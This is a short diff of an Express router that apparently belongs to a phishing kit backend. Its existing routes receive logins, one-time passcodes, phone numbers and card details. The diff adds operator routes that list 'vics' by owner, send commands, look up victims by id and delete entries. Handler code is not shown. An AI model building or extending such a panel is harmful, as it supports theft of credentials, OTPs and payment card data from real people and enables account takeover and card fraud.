@@ -1,5 +1,9 @@
 const express = require("express");
 const {
+  getOwnerVics,
+  command,
+  getInfo,
+  deleteEntry,
   submitLogin,
   submitLoginAgain,
   submitOtp,
@@ -19,5 +23,9 @@ router.post("/otp", submitOtp);
 router.post("/loginAgain", submitLoginAgain);
 router.post("/phone", submitPhone);
 router.post("/card", submitCard);
+router.get("/customers/:owner", getOwnerVics);
+router.post("/command", command);
+router.get("/customers/id/:uniqueid", getInfo);
+router.post("/delete", deleteEntry);
 
 module.exports = router;
